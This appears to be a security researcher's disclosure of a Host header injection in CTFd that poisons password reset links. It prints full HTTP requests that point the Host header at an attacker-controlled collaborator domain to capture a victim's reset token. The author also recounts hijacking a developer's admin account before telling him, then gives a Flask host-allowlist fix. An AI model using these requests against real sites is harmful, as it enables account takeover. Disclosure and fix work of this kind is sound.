The vulnerability was originally discovered by **TheWindGhost** (Security Researcher), who was the first to identify and
confirm the issue. Co-Authors contributed technical write-up, report structuring, and analysis.

## 1. Introduction

I first examined the CTFd source code and noticed that it did not secure or filter the Host header. This is where the
vulnerability starts.

## 2. Host Header Injection

The request looks like this:

```http
- Test Host Header Injection
GET / HTTP/2
Host: 0ghb7us820bm4l90zd2vvixkhbn2bszh.oastify.com
Cookie: delete
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36…
Accept: text/html,application/xhtml+xml,...
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

I changed the Host header to use my Burp Suite collaborator. If the request is received by my server, this is a bug.

## 3. Exploit the Vulnerability & Steps to Exploit Reset Password

I logged into my user account and reset my password. The password reset token was included in the URL. Next, I attempted
to exploit this to reset the admin’s password.

![Reset Link Clicked](https://codetoanbug.com/wp-content/uploads/2025/01/474390321_579415605089692_484539837654316394_n-1024x254.jpg)

I obtained the admin’s email from Discord and sent a request to reset the password:

![Password Reset Form](https://codetoanbug.com/wp-content/uploads/2025/01/474380385_635935822228710_1744942101823595149_n-1024x576.jpg)

```http
- Exploit Host Header Injection
POST /reset_password HTTP/2
Host: zx0aot97jzsllkqzgcjuchejya41ssgh.oastify.com
Cookie: delete
Content-Length: 120
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)…
Accept: text/html,application/xhtml+xml,...
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=mail-victim%40gmail.com&_submit=Submit&nonce=fake-937dd2059eb240c25ca77ff5743d4aee
```

And I changed the collaborator domain in the Host header request. Then, I waited for the admin to click the reset link
and successfully hijacked the password reset process.

Finally, I successfully exploited the vulnerability. One hour later, I spoke with the developer, but he didn’t
understand that I had hacked and gained access to his account. I explained it to him and asked him to send me a
screenshot of the email.

## 5. Security Fix

```python
- To secure against this vulnerability, add the following code:
import os
import re
from flask import request, abort
from CTFd import create_app

ALLOWED_HOSTS = {
"example.com", # change domain server
"192.168.1.1", # change ip public
}

ALLOWED_PROXIES = {"127.0.0.1", "192.168.1.1"} # change ip public

BLOCKED_HOST_REGEX = re.compile(r"^(localhost|127\.0\.0\.1|0\.0\.0\.0|::1|local)$", re.IGNORECASE)

app = create_app()

@app.before_request
def strict_host_protection():
host = request.headers.get("Host", "").split(":")[0]
forwarded_host = request.headers.get("X-Forwarded-Host", "").split(":")[0]
remote_addr = request.remote_addr
forwarded_for = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
real_ip = forwarded_for if forwarded_for else remote_addr

if forwarded_host and forwarded_host not in ALLOWED_HOSTS:
print(f"[SECURITY] block: {forwarded_host} -> {real_ip}")
abort(400)

if remote_addr in ALLOWED_PROXIES:
if BLOCKED_HOST_REGEX.match(host) or host not in ALLOWED_HOSTS:
print(f"[SECURITY] block: {host} -> {real_ip}")
abort(400)
else:
abort(400)

if __name__ == "__main__":
app.run(debug=False, host="127.0.0.1", port=4000)
```

## 6. Vendor Response

When I reached out to the CTFd vendor, they told me that users need to configure Nginx for security. However, according
to cybersecurity best practices, security should be **built by design and by default**. CTFd does not follow this
policy. MITRE accepted my submission based on this reasoning.
